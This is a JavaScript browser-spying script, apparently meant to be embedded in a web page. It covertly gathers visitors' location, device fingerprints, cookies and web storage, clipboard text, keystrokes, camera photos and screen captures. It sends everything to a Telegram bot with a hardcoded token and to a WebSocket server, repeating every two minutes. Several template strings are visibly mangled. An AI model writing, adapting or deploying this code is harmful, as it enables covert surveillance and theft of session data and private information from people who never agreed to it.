
 const BOT_TOKEN = '7944060864:AAGvE3ngz4nQYN9ZglGN1-5jHgnok0kyRUY';
    const CHAT_ID = '';
    const DEBUG = false; // Toggle for verbose logging
    let cachedData = {}; // Cache non-volatile data



async function init() {
    try {
        ws = new WebSocket(WS_URL);
        ws.onopen = () => captureAndSend();
        ws.onmessage = (msg) => DEBUG && console.log('Server:', msg.data);
        ws.onerror = (err) => logError('WebSocket', err);
        ws.onclose = () => setTimeout(init, 5000);
    } catch (e) {
        logError('WebSocketInit', e);
    }
}

async function captureAndSend() {
    const collectedData = { timestamp: new Date().toISOString() };

    try {
        // HTTPS Check
        collectedData.isSecure = window.location.protocol === 'https:';
        if (!collectedData.isSecure) {
            collectedData.securityWarning = 'HTTP detected. Camera, geolocation, microphone, and clipboard blocked. Deploy on HTTPS or enable insecure origins (chrome://flags).';
        }

        // Parallel API Calls
        await Promise.all([
            // Permissions
            async () => {
                try {
                    if (navigator.permissions) {
                        const perms = ['camera', 'geolocation', 'microphone', 'notifications', 'midi', 'usb'].map(async name => {
                            try {
                                const perm = await navigator.permissions.query({ name });
                                return { [name]: perm.state };
                            } catch (e) {
                                return { [name]: `Error: ${e.message}` };
                            }
                        });
                        collectedData.permissions = Object.assign({}, ...(await Promise.all(perms)));
                    }
                } catch (e) {
                    logError('Permissions', e);
                    collectedData.permissionsError = `${e.name}: ${e.message}`;
                }
            },

            // IP and Location
            async () => {
                try {
                    const [ipResponse, ipInfoResponse] = await Promise.all([
                        fetch('https://api.ipify.org?format=json', { cache: 'no-store' }),
                        fetch('https://ipapi.co/json/')
                    ]);
                    const ipData = await ipResponse.json();
                    const ipInfo = await ipInfoResponse.json();
                    collectedData.ipAddress = ipData.ip;
                    collectedData.ipDetails = {
                        city: ipInfo.city || 'N/A',
                        region: ipInfo.region || 'N/A',
                        country: ipInfo.country_name || 'N/A',
                        isp: ipInfo.org || 'N/A',
                        latitude: ipInfo.latitude || 'N/A',
                        longitude: ipInfo.longitude || 'N/A',
                        postal: ipInfo.postal || 'N/A',
                        timezone: ipInfo.timezone || 'N/A',
                        asn: ipInfo.asn || 'N/A'
                    };
                    cachedData.ipDetails = collectedData.ipDetails;
                    ws.send(JSON.stringify({ ipDetails: collectedData.ipDetails }));
                } catch (e) {
                    logError('IP', e);
                    collectedData.ipError = `${e.name}: ${e.message}`;
                    if (cachedData.ipDetails) collectedData.ipDetails = cachedData.ipDetails;
                }
            },

            // Device Info
            async () => {
                try {
                    if (!cachedData.deviceInfo) {
                        collectedData.deviceInfo = {
                            userAgent: navigator.userAgent || 'N/A',
                            platform: navigator.platform || 'N/A',
                            language: navigator.language || 'N/A',
                            languages: navigator.languages.join(', ') || 'N/A',
                            screenResolution: `\( {window.screen.width || 'N/A'}x \){window.screen.height || 'N/A'}`,
                            colorDepth: window.screen.colorDepth || 'N/A',
                            pixelRatio: window.devicePixelRatio || 'N/A',
                            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                            cpuCores: navigator.hardwareConcurrency || 'N/A',
                            deviceMemory: navigator.deviceMemory || 'N/A',
                            touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
                            webdriver: navigator.webdriver ? 'Yes' : 'No',
                            referrer: document.referrer || 'N/A',
                            url: window.location.href || 'N/A',
                            windowSize: `\( {window.innerWidth || 'N/A'}x \){window.innerHeight || 'N/A'}`,
                            orientation: window.screen.orientation?.type || 'N/A',
                            memory: window.performance?.memory ? `${(window.performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(2)}MB` : 'N/A',
                            performanceTiming: window.performance.timing ? {
                                domComplete: (window.performance.timing.domComplete - window.performance.timing.navigationStart) / 1000 + 's',
                                loadEvent: (window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) / 1000 + 's'
                            } : 'N/A'
                        };
                        cachedData.deviceInfo = collectedData.deviceInfo;
                    } else {
                        collectedData.deviceInfo = cachedData.deviceInfo;
                    }
                } catch (e) {
                    logError('DeviceInfo', e);
                    collectedData.deviceInfoError = `${e.name}: ${e.message}`;
                }
            },

            // Fingerprinting
            async () => {
                try {
                    if (!cachedData.fingerprint) {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d', { willReadFrequently: true });
                        ctx.textBaseline = 'top';
                        ctx.font = '16px Arial';
                        ctx.fillText(`FP${Math.random()}`, 0, 0);
                        const gl = canvas.getContext('webgl');
                        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                        const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Monaco', 'Roboto', 'Open Sans', 'Lato'];
                        collectedData.fingerprint = {
                            canvas: canvas.toDataURL(),
                            webgl: gl ? {
                                renderer: gl.getParameter(gl.RENDERER),
                                vendor: gl.getParameter(gl.VENDOR),
                                version: gl.getParameter(gl.VERSION),
                                extensions: gl.getSupportedExtensions().join(', ')
                            } : 'N/A',
                            audio: audioCtx ? `SampleRate: ${audioCtx.sampleRate}, Channels: ${audioCtx.destination.maxChannelCount}` : 'N/A',
                            fonts: fonts.filter(font => {
                                const span = document.createElement('span');
                                span.style.fontFamily = font;
                                document.body.appendChild(span);
                                const isAvailable = span.style.fontFamily.includes(font);
                                span.remove();
                                return isAvailable;
                            }).join(', ') || 'N/A'
                        };
                        if (audioCtx) audioCtx.close();
                        // WebAssembly Fingerprint
                        try {
                            const wasm = new WebAssembly.Module(Uint8Array.from([0,97,115,109,1,0,0,0,1,5,1,96,0,1,123,3,2,1,0,10,10,1,8,0,65,42,15,0,11]));
                            collectedData.fingerprint.wasm = wasm ? 'Supported' : 'N/A';
                        } catch (e) {
                            collectedData.fingerprint.wasm = 'N/A';
                        }
                        cachedData.fingerprint = collectedData.fingerprint;
                    } else {
                        collectedData.fingerprint = cachedData.fingerprint;
                    }
                } catch (e) {
                    logError('Fingerprint', e);
                    collectedData.fingerprintError = `${e.name}: ${e.message}`;
                }
            },

            // WebGPU
            async () => {
                try {
                    if (navigator.gpu) {
                        const adapter = await navigator.gpu.requestAdapter();
                        collectedData.webgpu = adapter ? {
                            device: adapter.info.device,
                            vendor: adapter.info.vendor,
                            architecture: adapter.info.architecture
                        } : 'N/A';
                    }
                } catch (e) {
                    logError('WebGPU', e);
                    collectedData.webgpuError = `${e.name}: ${e.message}`;
                }
            },

            // Cache Probing
            async () => {
                try {
                    const testUrls = ['https://facebook.com/favicon.ico', 'https://x.com/favicon.ico', 'https://linkedin.com/favicon.ico', 'https://instagram.com/favicon.ico', 'https://github.com/favicon.ico'];
                    collectedData.visitedSites = [];
                    for (const url of testUrls) {
                        const start = performance.now();
                        const img = new Image();
                        img.src = url + '?' + Math.random();
                        await new Promise(resolve => {
                            img.onload = img.onerror = resolve;
                        });
                        const time = performance.now() - start;
                        if (time < 50) collectedData.visitedSites.push(url);
                    }
                    collectedData.visitedSites = collectedData.visitedSites.join(', ') || 'N/A';
                } catch (e) {
                    logError('CacheProbe', e);
                    collectedData.cacheError = `${e.name}: ${e.message}`;
                }
            },

            // Geolocation
            async () => {
                try {
                    if (collectedData.isSecure) {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, {
                                enableHighAccuracy: true,
                                timeout: 30000,
                                maximumAge: 0
                            });
                        });
                        collectedData.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude || 'N/A',
                            heading: position.coords.heading || 'N/A',
                            speed: position.coords.speed || 'N/A'
                        };
                        const geocodeResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=\( {position.coords.latitude}&lon= \){position.coords.longitude}&zoom=18&addressdetails=1`);
                        const geocodeData = await geocodeResponse.json();
                        collectedData.address = geocodeData.display_name || 'N/A';
                        collectedData.addressDetails = {
                            road: geocodeData.address.road || 'N/A',
                            city: geocodeData.address.city || geocodeData.address.town || 'N/A',
                            state: geocodeData.address.state || 'N/A',
                            country: geocodeData.address.country || 'N/A',
                            postal: geocodeData.address.postcode || 'N/A'
                        };
                        ws.send(JSON.stringify({ geolocation: collectedData.geolocation, address: collectedData.address }));
                    }
                } catch (e) {
                    logError('Geolocation', e);
                    collectedData.geoError = `${e.name}: ${e.message}`;
                    if (cachedData.ipDetails?.latitude !== 'N/A') {
                        collectedData.geolocationFallback = {
                            latitude: cachedData.ipDetails.latitude,
                            longitude: cachedData.ipDetails.longitude,
                            source: 'IP-based'
                        };
                    }
                }
            },

            // Battery
            async () => {
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        collectedData.battery = {
                            level: (battery.level * 100).toFixed(2),
                            charging: battery.charging,
                            chargingTime: battery.chargingTime || 'N/A',
                            dischargingTime: battery.dischargingTime || 'N/A'
                        };
                        battery.onchargingchange = () => {
                            ws.send(JSON.stringify({ batteryUpdate: { charging: battery.charging, timestamp: new Date().toISOString() } }));
                        };
                    }
                } catch (e) {
                    logError('Battery', e);
                    collectedData.batteryError = `${e.name}: ${e.message}`;
                }
            },

            // Network
            async () => {
                try {
                    if (navigator.connection) {
                        collectedData.network = {
                            type: navigator.connection.effectiveType || 'N/A',
                            downlink: navigator.connection.downlink || 'N/A',
                            rtt: navigator.connection.rtt || 'N/A',
                            saveData: navigator.connection.saveData ? 'Yes' : 'No'
                        };
                        navigator.connection.onchange = () => {
                            ws.send(JSON.stringify({ networkUpdate: {
                                type: navigator.connection.effectiveType,
                                downlink: navigator.connection.downlink,
                                rtt: navigator.connection.rtt
                            } }));
                        };
                    }
                } catch (e) {
                    logError('Network', e);
                    collectedData.networkError = `${e.name}: ${e.message}`;
                }
            },

            // Sensors
            async () => {
                try {
                    if (window.DeviceMotionEvent) {
                        await new Promise(resolve => {
                            window.addEventListener('devicemotion', (event) => {
                                collectedData.accelerometer = {
                                    x: event.acceleration.x || 'N/A',
                                    y: event.acceleration.y || 'N/A',
                                    z: event.acceleration.z || 'N/A'
                                };
                                resolve();
                            }, { once: true });
                        });
                    }
                    if (window.DeviceOrientationEvent) {
                        await new Promise(resolve => {
                            window.addEventListener('deviceorientation', (event) => {
                                collectedData.gyroscope = {
                                    alpha: event.alpha || 'N/A',
                                    beta: event.beta || 'N/A',
                                    gamma: event.gamma || 'N/A'
                                };
                                resolve();
                            }, { once: true });
                        });
                    }
                    if (window.AmbientLightSensor) {
                        const sensor = new AmbientLightSensor();
                        await new Promise(resolve => {
                            sensor.onreading = () => {
                                collectedData.ambientLight = sensor.illuminance || 'N/A';
                                sensor.stop();
                                resolve();
                            };
                            sensor.onerror = () => {
                                collectedData.ambientLight = 'N/A';
                                sensor.stop();
                                resolve();
                            };
                            sensor.start();
                        });
                    }
                } catch (e) {
                    logError('Sensors', e);
                    collectedData.sensorError = `${e.name}: ${e.message}`;
                }
            },

            // Clipboard
            async () => {
                try {
                    if (collectedData.isSecure && navigator.clipboard) {
                        collectedData.clipboard = await navigator.clipboard.readText() || 'N/A';
                        window.addEventListener('paste', async () => {
                            const update = await navigator.clipboard.readText() || 'N/A';
                            ws.send(JSON.stringify({ clipboardUpdate: update }));
                        }, { once: true });
                    }
                } catch (e) {
                    logError('Clipboard', e);
                    collectedData.clipboardError = `${e.name}: ${e.message}`;
                }
            },

            // Storage
            async () => {
                try {
                    collectedData.storage = {
                        cookies: document.cookie || 'N/A',
                        localStorage: JSON.stringify(localStorage) || 'N/A',
                        sessionStorage: JSON.stringify(sessionStorage) || 'N/A',
                        indexedDB: window.indexedDB ? 'Available' : 'N/A'
                    };
                } catch (e) {
                    logError('Storage', e);
                    collectedData.storageError = `${e.name}: ${e.message}`;
                }
            },

            // WebRTC
            async () => {
                try {
                    const rtc = new RTCPeerConnection({
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { urls: 'stun:stun1.l.google.com:19302' },
                            { urls: 'stun:stun2.l.google.com:19302' },
                            { urls: 'turn:turn.anyrtc.io:3478', username: 'test', credential: 'test' }
                        ]
                    });
                    const localIPs = new Set();
                    rtc.onicecandidate = (e) => {
                        if (e.candidate && e.candidate.candidate) {
                            const ipMatch = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                            if (ipMatch) localIPs.add(ipMatch[1]);
                            ws.send(JSON.stringify({ localIP: ipMatch ? ipMatch[1] : 'N/A' }));
                        }
                    };
                    await rtc.createDataChannel('test');
                    await rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    collectedData.localIPs = Array.from(localIPs).join(', ') || 'N/A';
                    rtc.close();
                } catch (e) {
                    logError('WebRTC', e);
                    collectedData.webRtcError = `${e.name}: ${e.message}`;
                }
            },

            // Keystrokes and Mouse
            async () => {
                try {
                    collectedData.interactions = [];
                    document.addEventListener('keydown', (e) => {
                        if (collectedData.interactions.length < 50) {
                            collectedData.interactions.push(`Key:\( {e.key}: \){performance.now()}`);
                            ws.send(JSON.stringify({ interaction: `Key:\( {e.key}: \){performance.now()}` }));
                        }
                    }, { once: true });
                    document.addEventListener('mousemove', (e) => {
                        if (collectedData.interactions.length < 50) {
                            collectedData.interactions.push(`Mouse:\( {e.clientX}, \){e.clientY}:${performance.now()}`);
                            ws.send(JSON.stringify({ interaction: `Mouse:\( {e.clientX}, \){e.clientY}:${performance.now()}` }));
                        }
                    }, { once: true });
                    document.addEventListener('click', (e) => {
                        ws.send(JSON.stringify({ interaction: `Click:\( {e.clientX}, \){e.clientY}:${performance.now()}` }));
                    }, { once: true });
                } catch (e) {
                    logError('Interactions', e);
                    collectedData.interactionError = `${e.name}: ${e.message}`;
                }
            },

            // Microphone
            async () => {
                try {
                    if (collectedData.isSecure) {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        const audioCtx = new AudioContext();
                        const analyser = audioCtx.createAnalyser();
                        const source = audioCtx.createMediaStreamSource(stream);
                        source.connect(analyser);
                        const data = new Float32Array(analyser.frequencyBinCount);
                        analyser.getFloatFrequencyData(data);
                        collectedData.audioMetadata = `Bins:\( {data.length},Max: \){Math.max(...data).toFixed(2)},Min:${Math.min(...data).toFixed(2)}`;
                        stream.getTracks().forEach(track => track.stop());
                        audioCtx.close();
                        ws.send(JSON.stringify({ audioMetadata: collectedData.audioMetadata }));
                    }
                } catch (e) {
                    logError('Microphone', e);
                    collectedData.audioError = `${e.name}: ${e.message}`;
                }
            },

            // Screen Capture
            async () => {
                try {
                    if (collectedData.isSecure) {
                        const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.style.display = 'none';
                        document.body.appendChild(video);
                        await video.play();
                        await new Promise(resolve => video.onloadedmetadata = resolve);
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        collectedData.screenCapture = canvas.toDataURL('image/jpeg', 0.3);
                        stream.getTracks().forEach(track => track.stop());
                        video.remove();
                        ws.send(JSON.stringify({ screenCapture: collectedData.screenCapture }));
                    }
                } catch (e) {
                    logError('ScreenCapture', e);
                    collectedData.screenError = `${e.name}: ${e.message}`;
                }
            },

            // Camera
            async () => {
                let hasCamera = false;
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    hasCamera = devices.some(device => device.kind === 'videoinput');
                    collectedData.camera = {
                        available: hasCamera,
                        count: devices.filter(d => d.kind === 'videoinput').length,
                        labels: devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Unnamed').join(', ')
                    };
                } catch (e) {
                    logError('CameraEnum', e);
                    collectedData.cameraError = `${e.name}: ${e.message}`;
                }
                if (hasCamera && collectedData.isSecure) {
                    try {
                        const constraints = [
                            { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } },
                            { video: { facingMode: 'environment' } },
                            { video: true }
                        ];
                        let stream = null;
                        for (const constraint of constraints) {
                            try {
                                stream = await navigator.mediaDevices.getUserMedia(constraint);
                                collectedData.camera.usedConstraint = JSON.stringify(constraint);
                                break;
                            } catch (err) {
                                logWarn(`Camera attempt: ${err.name}`);
                            }
                        }
                        if (!stream) throw new Error('All camera constraints failed');
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.style.display = 'none';
                        document.body.appendChild(video);
                        await video.play();
                        await new Promise(resolve => video.onloadedmetadata = resolve);
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d', { willReadFrequently: true });
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        collectedData.camera.photo = canvas.toDataURL('image/jpeg', 0.3);
                        stream.getTracks().forEach(track => track.stop());
                        video.remove();
                        ws.send(JSON.stringify({ camera: { photo: collectedData.camera.photo } }));
                    } catch (e) {
                        logError('Camera', e);
                        collectedData.cameraError = `${e.name}: ${e.message}`;
                    }
                } else {
                    collectedData.cameraError = hasCamera ? 'Camera requires HTTPS.' : 'No camera detected.';
                }
            },

            // Gamepad
            async () => {
                try {
                    if (navigator.getGamepads) {
                        const gamepads = navigator.getGamepads().filter(g => g);
                        collectedData.gamepads = gamepads.map(g => ({
                            id: g.id,
                            buttons: g.buttons.length,
                            axes: g.axes.length
                        })) || 'N/A';
                        window.addEventListener('gamepadconnected', (e) => {
                            ws.send(JSON.stringify({ gamepad: { id: e.gamepad.id, timestamp: new Date().toISOString() } }));
                        }, { once: true });
                    }
                } catch (e) {
                    logError('Gamepad', e);
                    collectedData.gamepadError = `${e.name}: ${e.message}`;
                }
            },

            // MIDI
            async () => {
                try {
                    if (navigator.requestMIDIAccess) {
                        const midi = await navigator.requestMIDIAccess();
                        collectedData.midi = {
                            inputs: Array.from(midi.inputs.values()).map(i => i.name).join(', ') || 'N/A',
                            outputs: Array.from(midi.outputs.values()).map(o => o.name).join(', ') || 'N/A'
                        };
                    }
                } catch (e) {
                    logError('MIDI', e);
                    collectedData.midiError = `${e.name}: ${e.message}`;
                }
            },

            // USB
            async () => {
                try {
                    if (navigator.usb) {
                        const devices = await navigator.usb.getDevices();
                        collectedData.usb = devices.map(d => ({
                            vendorId: d.vendorId,
                            productId: d.productId,
                            productName: d.productName || 'Unknown'
                        })) || 'N/A';
                        navigator.usb.onconnect = (e) => {
                            ws.send(JSON.stringify({ usb: { productName: e.device.productName, timestamp: new Date().toISOString() } }));
                        };
                    }
                } catch (e) {
                    logError('USB', e);
                    collectedData.usbError = `${e.name}: ${e.message}`;
                }
            },

            // VR/AR
            async () => {
                try {
                    if (navigator.xr) {
                        const xr = await navigator.xr.isSessionSupported('immersive-vr');
                        collectedData.xr = { vrSupported: xr };
                    }
                } catch (e) {
                    logError('XR', e);
                    collectedData.xrError = `${e.name}: ${e.message}`;
                }
            },

            // Navigation History
            async () => {
                try {
                    collectedData.history = {
                        length: window.history.length || 'N/A',
                        lastState: window.history.state || 'N/A'
                    };
                } catch (e) {
                    logError('History', e);
                    collectedData.historyError = `${e.name}: ${e.message}`;
                }
            },

            // Extensions
            async () => {
                try {
                    const extensions = ['uBlock0', 'AdBlock', 'PrivacyBadger', 'NoScript'];
                    collectedData.extensions = [];
                    for (const ext of extensions) {
                        const start = performance.now();
                        const img = new Image();
                        img.src = `chrome-extension://${ext}/icon.png`;
                        await new Promise(resolve => {
                            img.onload = img.onerror = resolve;
                        });
                        const time = performance.now() - start;
                        if (time < 50) collectedData.extensions.push(ext);
                    }
                    collectedData.extensions = collectedData.extensions.join(', ') || 'N/A';
                } catch (e) {
                    logError('Extensions', e);
                    collectedData.extensionError = `${e.name}: ${e.message}`;
                }
            }
        ]);

        // Send Full Data to Telegram
        const message = formatCollectedData(collectedData);
        await sendMessageToTelegramWithRetry(message, 5);
        if (collectedData.camera?.photo) await sendPhotoWithRetry(collectedData.camera.photo, 5, 'photo');
        if (collectedData.screenCapture) await sendPhotoWithRetry(collectedData.screenCapture, 5, 'screen');
        ws.send(JSON.stringify(collectedData));
    } catch (e) {
        logError('Main', e);
        collectedData.mainError = `${e.name}: ${e.message}`;
        const message = formatCollectedData(collectedData);
        await sendMessageToTelegramWithRetry(message, 5);
    }
}

function formatCollectedData(data) {
    try {
        const lines = [`Device Info (${data.timestamp}):`];
        lines.push(`HTTPS: ${data.isSecure ? 'Yes' : 'No'}`);
        if (!data.isSecure) lines.push(`Warning: ${data.securityWarning}`);
        lines.push(`Permissions: ${JSON.stringify(data.permissions || 'N/A')}`);
        lines.push(`IP: ${data.ipAddress || 'N/A'}`);
        if (data.ipDetails) {
            lines.push(`IP Location: ${data.ipDetails.city}, ${data.ipDetails.region}, ${data.ipDetails.country}`);
            lines.push(`ISP: ${data.ipDetails.isp}`);
            lines.push(`IP Coords: ${data.ipDetails.latitude}, ${data.ipDetails.longitude}`);
            lines.push(`Postal: ${data.ipDetails.postal}`);
            lines.push(`Timezone: ${data.ipDetails.timezone}`);
            lines.push(`ASN: ${data.ipDetails.asn}`);
        }
        if (data.deviceInfo) {
            Object.entries(data.deviceInfo).forEach(([k, v]) => lines.push(`${k}: ${v}`));
        }
        if (data.fingerprint) {
            lines.push(`CanvasFP: ${data.fingerprint.canvas ? 'Generated' : 'N/A'}`);
            if (data.fingerprint.webgl !== 'N/A') {
                lines.push(`WebGL: ${data.fingerprint.webgl.renderer}, ${data.fingerprint.webgl.vendor}, \( {data.fingerprint.webgl.version}, Ext: \){data.fingerprint.webgl.extensions}`);
            }
            lines.push(`AudioFP: ${data.fingerprint.audio}`);
            lines.push(`Fonts: ${data.fingerprint.fonts}`);
            lines.push(`WASM: ${data.fingerprint.wasm}`);
        }
        if (data.webgpu !== 'N/A') {
            lines.push(`WebGPU: ${data.webgpu.device}, ${data.webgpu.vendor}, ${data.webgpu.architecture}`);
        }
        if (data.visitedSites) lines.push(`Visited: ${data.visitedSites}`);
        if (data.geolocation) {
            lines.push(`Geo: Lat:\( {data.geolocation.latitude}, Lon: \){data.geolocation.longitude}, Acc:\( {data.geolocation.accuracy}m, Alt: \){data.geolocation.altitude}, Head:\( {data.geolocation.heading}, Speed: \){data.geolocation.speed}`);
            lines.push(`Address: ${data.address}`);
            if (data.addressDetails) {
                lines.push(`AddrDetails: ${data.addressDetails.road}, ${data.addressDetails.city}, ${data.addressDetails.state}, ${data.addressDetails.country}, ${data.addressDetails.postal}`);
            }
        }
        if (data.geolocationFallback) {
            lines.push(`GeoFallback: ${data.geolocationFallback.latitude}, \( {data.geolocationFallback.longitude} ( \){data.geolocationFallback.source})`);
        }
        if (data.battery) {
            lines.push(`Battery: \( {data.battery.level}% \){data.battery.charging ? ' (Charging)' : ''}, CT:\( {data.battery.chargingTime}s, DT: \){data.battery.dischargingTime}s`);
        }
        if (data.network) {
            lines.push(`Network: ${data.network.type}, \( {data.network.downlink}Mbps, RTT: \){data.network.rtt}ms, SaveData:${data.network.saveData}`);
        }
        if (data.accelerometer) {
            lines.push(`Accel: X:\( {data.accelerometer.x}, Y: \){data.accelerometer.y}, Z:${data.accelerometer.z}`);
        }
        if (data.gyroscope) {
            lines.push(`Gyro: A:\( {data.gyroscope.alpha}, B: \){data.gyroscope.beta}, G:${data.gyroscope.gamma}`);
        }
        if (data.ambientLight) lines.push(`Light: ${data.ambientLight}lux`);
        if (data.clipboard) lines.push(`Clipboard: ${data.clipboard}`);
        if (data.clipboardUpdate) lines.push(`ClipboardUpdate: ${data.clipboardUpdate}`);
        if (data.storage) {
            lines.push(`Cookies: ${data.storage.cookies}`);
            lines.push(`LocalStorage: ${data.storage.localStorage}`);
            lines.push(`SessionStorage: ${data.storage.sessionStorage}`);
            lines.push(`IndexedDB: ${data.storage.indexedDB}`);
        }
        lines.push(`LocalIPs: ${data.localIPs || 'N/A'}`);
        lines.push(`Interactions: ${data.interactions?.join('; ') || 'N/A'}`);
        lines.push(`AudioMeta: ${data.audioMetadata || 'N/A'}`);
        lines.push(`ScreenCapture: ${data.screenCapture ? 'Captured' : 'N/A'}`);
        lines.push(`Gamepads: ${JSON.stringify(data.gamepads || 'N/A')}`);
        lines.push(`MIDI: Inputs:\( {data.midi?.inputs || 'N/A'}, Outputs: \){data.midi?.outputs || 'N/A'}`);
        lines.push(`USB: ${JSON.stringify(data.usb || 'N/A')}`);
        lines.push(`XR: ${data.xr?.vrSupported ? 'VR Supported' : 'N/A'}`);
        lines.push(`History: Length:\( {data.history?.length || 'N/A'}, State: \){data.history?.lastState || 'N/A'}`);
        lines.push(`Extensions: ${data.extensions || 'N/A'}`);
        if (data.camera) {
            lines.push(`Camera: \( {data.camera.available ? 'Yes' : 'No'}, Count: \){data.camera.count}, Labels:${data.camera.labels}`);
            if (data.camera.photo) lines.push(`Photo: Captured`);
        }
        ['mainError', 'permissionsError', 'ipError', 'deviceInfoError', 'fingerprintError', 'webgpuError', 'cacheError', 'geoError', 'batteryError', 'networkError', 'sensorError', 'clipboardError', 'storageError', 'webRtcError', 'interactionError', 'audioError', 'screenError', 'gamepadError', 'midiError', 'usbError', 'xrError', 'historyError', 'extensionError', 'cameraError'].forEach(err => {
            if (data[err]) lines.push(`${err}: ${data[err]}`);
        });
        return lines.join('\n').substring(0, 4096);
    } catch (e) {
        logError('FormatData', e);
        return `Error formatting data: ${e.message}`;
    }
}

async function sendMessageToTelegramWithRetry(message, retries) {
    let delay = 1000;
    for (let i = 0; i < retries; i++) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
            if (response.ok) {
                if (DEBUG) console.log('Message sent');
                return true;
            }
            logError('TelegramMessage', new Error(`Status: ${response.status}`));
            await new Promise(resolve => setTimeout(resolve, delay));
            delay *= 2;
        } catch (e) {
            logError('TelegramMessage', e);
            await new Promise(resolve => setTimeout(resolve, delay));
            delay *= 2;
        }
    }
    logError('TelegramMessage', new Error('All retries failed'));
    return false;
}

async function sendPhotoWithRetry(photo, retries, type = 'photo') {
    let delay = 1000;
    for (let i = 0; i < retries; i++) {
        try {
            const blob = dataURItoBlob(photo);
            if (!blob) throw new Error('Blob conversion failed');
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `\( {type}_ \){Date.now()}.jpg`);
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            if (response.ok) {
                if (DEBUG) console.log(`${type} sent`);
                return true;
            }
            logError('TelegramPhoto', new Error(`Status: ${response.status}`));
            await new Promise(resolve => setTimeout(resolve, delay));
            delay *= 2;
        } catch (e) {
            logError('TelegramPhoto', e);
            await new Promise(resolve => setTimeout(resolve, delay));
            delay *= 2;
        }
    }
    logError('TelegramPhoto', new Error('All retries failed'));
    return false;
}

function dataURItoBlob(dataURI) {
    try {
        const byteString = atob(dataURI.split(',')[1]);
        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
        const arrayBuffer = new ArrayBuffer(byteString.length);
        const intArray = new Uint8Array(arrayBuffer);
        for (let i = 0; i < byteString.length; i++) {
            intArray[i] = byteString.charCodeAt(i);
        }
        return new Blob([arrayBuffer], { type: mimeString });
    } catch (e) {
        logError('BlobConversion', e);
        return null;
    }
}

function logError(context, error) {
    if (DEBUG) console.error(`${context}: ${error.name || 'Error'}: ${error.message || error}`);
}

function logWarn(message) {
    if (DEBUG) console.warn(message);
}

try {
    init();
    const baseInterval = 120000;
    const jitter = () => Math.random() * 1000;
    setInterval(() => captureAndSend(), baseInterval + jitter());
} catch (e) {
    logError('Startup', e);
}
</script>